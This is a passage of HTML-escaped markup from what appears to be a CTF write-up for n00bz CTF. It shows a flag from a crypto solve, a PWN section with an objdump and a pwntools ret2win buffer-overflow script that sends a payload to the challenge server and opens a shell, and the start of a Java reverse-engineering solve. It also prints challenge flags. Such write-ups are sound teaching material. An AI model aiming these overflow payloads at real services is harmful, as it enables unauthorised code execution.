&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unhexlify&lt;&#x2F;span&gt;&lt;span&gt;(M)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;utf-8&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# n00bz{5m4ll_3_1s_n3v3r_g00d!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : n00bz{5m4ll_3_1s_n3v3r_g00d!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;pwn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pwn&quot; aria-label=&quot;Anchor link for: pwn&quot;&gt;PWN&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Welcome to the series of 3 pwn challenges!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : nc challs.n00bzunit3d.xyz 35932
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [pwn1]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;By disasembling pwn1 binary in Binary Ninja, get to know that there were a &lt;code&gt;win()&lt;&#x2F;code&gt; function which is not called by any method. But by calling the win() will give us the shell of the system.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the objdump of pwn1&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; objdump&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d&lt;&#x2F;span&gt;&lt;span&gt; pwn1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000000004011fb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4011fb:&lt;&#x2F;span&gt;&lt;span&gt;	f3 0f 1e fa          	endbr64 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4011ff:&lt;&#x2F;span&gt;&lt;span&gt;	55                   	push   %rbp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401200:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 e5             	mov    %rsp,%rbp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401203:&lt;&#x2F;span&gt;&lt;span&gt;	48 83 ec 40          	sub    $0x40,%rsp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401207:&lt;&#x2F;span&gt;&lt;span&gt;	b8 00 00 00 00       	mov    $0x0,%eax
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40120c:&lt;&#x2F;span&gt;&lt;span&gt;	e8 85 ff ff ff       	call   401196 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;init&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401211:&lt;&#x2F;span&gt;&lt;span&gt;	48 8d 05 ec 0d 00 00 	lea    0xdec(%rip)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,%&lt;&#x2F;span&gt;&lt;span&gt;rax        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 402004 &amp;lt;_IO_stdin_used+0x4&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401218:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 c7             	mov    %rax,%rdi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40121b:&lt;&#x2F;span&gt;&lt;span&gt;	e8 50 fe ff ff       	call   401070 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;puts@plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401220:&lt;&#x2F;span&gt;&lt;span&gt;	48 8b 15 49 2e 00 00 	mov    0x2e49(%rip)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,%&lt;&#x2F;span&gt;&lt;span&gt;rdx        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 404070 &amp;lt;stdin@GLIBC_2.2.5&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401227:&lt;&#x2F;span&gt;&lt;span&gt;	48 8d 45 c0          	lea&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;    -0x40&lt;&#x2F;span&gt;&lt;span&gt;(%rbp)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,%&lt;&#x2F;span&gt;&lt;span&gt;rax
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40122b:&lt;&#x2F;span&gt;&lt;span&gt;	be 50 00 00 00       	mov    $0x50,%esi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401230:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 c7             	mov    %rax,%rdi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401233:&lt;&#x2F;span&gt;&lt;span&gt;	e8 58 fe ff ff       	call   401090 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;fgets@plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401238:&lt;&#x2F;span&gt;&lt;span&gt;	48 8d 05 dc 0d 00 00 	lea    0xddc(%rip)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,%&lt;&#x2F;span&gt;&lt;span&gt;rax        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 40201b &amp;lt;_IO_stdin_used+0x1b&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40123f:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 c7             	mov    %rax,%rdi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401242:&lt;&#x2F;span&gt;&lt;span&gt;	e8 39 fe ff ff       	call   401080 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;system@plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401247:&lt;&#x2F;span&gt;&lt;span&gt;	90                   	nop
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401248:&lt;&#x2F;span&gt;&lt;span&gt;	c9                   	leave  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401249:&lt;&#x2F;span&gt;&lt;span&gt;	c3                   	ret    
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000000000040124a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;win&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40124a:&lt;&#x2F;span&gt;&lt;span&gt;	f3 0f 1e fa          	endbr64 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40124e:&lt;&#x2F;span&gt;&lt;span&gt;	55                   	push   %rbp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40124f:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 e5             	mov    %rsp,%rbp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401252:&lt;&#x2F;span&gt;&lt;span&gt;	57                   	push   %rdi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401253:&lt;&#x2F;span&gt;&lt;span&gt;	48 8d 05 d3 0d 00 00 	lea    0xdd3(%rip)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,%&lt;&#x2F;span&gt;&lt;span&gt;rax        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 40202d &amp;lt;_IO_stdin_used+0x2d&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40125a:&lt;&#x2F;span&gt;&lt;span&gt;	48 89 c7             	mov    %rax,%rdi
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40125d:&lt;&#x2F;span&gt;&lt;span&gt;	e8 1e fe ff ff       	call   401080 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;system@plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401262:&lt;&#x2F;span&gt;&lt;span&gt;	90                   	nop
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401263:&lt;&#x2F;span&gt;&lt;span&gt;	5d                   	pop    %rbp
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;401264:&lt;&#x2F;span&gt;&lt;span&gt;	c3                   	ret    
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, It is a &lt;code&gt;ret2win&lt;&#x2F;code&gt; challenge.&lt;&#x2F;p&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. The offset size was 64 (By trail and error check for segementation fault)
&lt;&#x2F;span&gt;&lt;span&gt;2. Return instruction address in main `0x401249`
&lt;&#x2F;span&gt;&lt;span&gt;3. Address of win() `0x40124a`
&lt;&#x2F;span&gt;&lt;span&gt;4. The binary followed little-endian format.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, we have to send the offset first combined with the &lt;code&gt;ret&lt;&#x2F;code&gt; instruction address followed by &lt;code&gt;win()&lt;&#x2F;code&gt; address.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the complete solve.py&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solve.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;challs.n00bzunit3d.xyz&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;35932&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;p64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x401249&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# ret address 
&lt;&#x2F;span&gt;&lt;span&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;p64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40124a&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# address to win() function
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;interactive&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev&quot; aria-label=&quot;Anchor link for: rev&quot;&gt;REV&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;ezrev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ezrev&quot; aria-label=&quot;Anchor link for: ezrev&quot;&gt;EZrev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Rev is EZ!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [EZrev.class]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Decompiled the EZrev.class file to EZrev.java&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;EZrev.java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Arrays&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; 
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Decompiled by Procyon v0.5.36
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;EZrev
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public static void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(array&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;L&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; array[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;31&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;L&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;final int[]&lt;&#x2F;span&gt;&lt;span&gt; array2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;chars&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;toArray&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; array2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;i) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                array2[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)(array2[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
